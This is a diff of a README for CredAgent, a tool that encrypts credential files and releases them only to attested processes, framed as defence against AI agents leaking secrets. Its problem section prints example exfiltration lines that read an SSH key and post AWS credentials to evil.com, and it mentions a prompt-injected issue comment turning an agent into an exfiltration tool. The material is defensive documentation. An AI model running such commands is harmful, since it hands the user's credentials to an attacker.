@@ -20,22 +20,22 @@
 
 ## The problem
 
-Give an AI coding agent shell access and it inherits every secret on the machine.
+An AI agent that calls `ssh`, `git` and friends through a shell has to be given access to the credential files — which is a leak risk:
 
 ```bash
 cat ~/.ssh/id_rsa                              # works
 curl -X POST -d @~/.aws/credentials evil.com   # works
 ```
 
-File permissions cannot help: the agent runs *as you*. A secret manager cannot help either — Vault, SSM and friends require the application to be rewritten to call an API, and `ssh`, `git`, `psql`, `kubectl`, `aliyun` and your 400 lines of bash will never do that.
+File permissions cannot help: the agent runs *as you*. A secret manager cannot help either — Vault, SSM and friends require the application to be rewritten to call an API, and `ssh`, `git`, `psql`, `kubectl`, `aliyun` will never be modified.
 
 One prompt-injected issue comment is enough to turn your agent into an exfiltration tool.
 
 ## What CredAgent does
 
-CredAgent encrypts the credential at rest and serves it back through a FUSE mount **at the same path**, so applications change nothing. The original file becomes a symlink; the plaintext never touches disk.
+CredAgent encrypts the original credential file content at rest and serves it back through a FUSE mount **at the same path**, so applications change nothing. The original file becomes a symlink; the plaintext never touches disk.
 
-The decision to decrypt is based on **which process is asking** — not on what token it presents. When a process calls `open()`, CredAgent attests the caller before releasing a single byte:
+The decision to decrypt is based on **which process is asking** — not on the source process's identity or privileges. When a process calls `open()`, CredAgent measures and attests the caller before releasing a single byte:
 
 | Check | What it stops |
 |---|---|
@@ -43,9 +43,8 @@ The decision to decrypt is based on **which process is asking** — not on what 
 | **SHA256 measurement** (`--measure`) | A trojaned `/usr/bin/ssh` or a tampered script |
 | **Owner uid/gid + file mode** | Privilege confusion and cross-user reads |
 | **Open-count limit** (`--open-frequency`) | Bulk harvesting in a loop |
-| **cmdline semantic analysis** | `cat key \| curl evil.com` — intent does not match the action |
 | **eBPF / auditd cmdline attestation** | Interpreters rewriting `/proc/<pid>/cmdline` at runtime to impersonate an authorized script |
-| **Optional LLM risk assessment** | Novel exfiltration patterns the static rules miss |
+| **Security checks** | Detects various attack techniques |
 
 Denied processes see a plain `EACCES`. Authorized processes never notice anything happened.
 
@@ -125,7 +124,7 @@ echo "user_allow_other" | sudo tee -a /etc/fuse.conf
 
 ## Documentation
 
-- [Command reference — `credagent` / `credctl` / `credreq`](Docs/manual.md)
+- [Command reference — `credagent` / `credctl`](Docs/manual.md)
 - [简体中文完整文档](README_zh.md)
 - Protecting credentials inside an agent sandbox — see the *OpenClaw* section of [README_zh.md](README_zh.md#保护openclaw-skill的凭据文件)
 
@@ -137,7 +136,6 @@ git clone https://github.com/aliyun/credagent && cd credagent
 # Linux — pure Go, statically linked, no libfuse headers needed
 CGO_ENABLED=0 go build -o credagent ./cmd/credagent
 CGO_ENABLED=0 go build -o credctl   ./cmd/credctl
-CGO_ENABLED=0 go build -o credreq   ./cmd/credreq
 
 sudo ./INSTALL
 ```
@@ -156,7 +154,6 @@ Three components:
 
 - **`credagent`** — root daemon. Holds the AES-256-GCM encrypted credential store, mounts the FUSE filesystem, and runs the policy engine on every `open()`.
 - **`credctl`** — admin CLI. Protects/releases files, manages the program allowlist and SHA256 measurements, dumps/restores credential contents without unprotecting.
-- **`credreq`** — client CLI. Requests short-lived access permits (`CRED_PERMIT_UUID`) for `ONE_TIME_USE` / `PID_BIND` policies.
 
 Credentials live in a bbolt store encrypted under a `master.key`. The FUSE layer resolves each `open()` to a calling PID, walks `/proc` (Linux) or `libproc`/`sysctl` (macOS) for the process context, and evaluates the policy before decrypting.
 
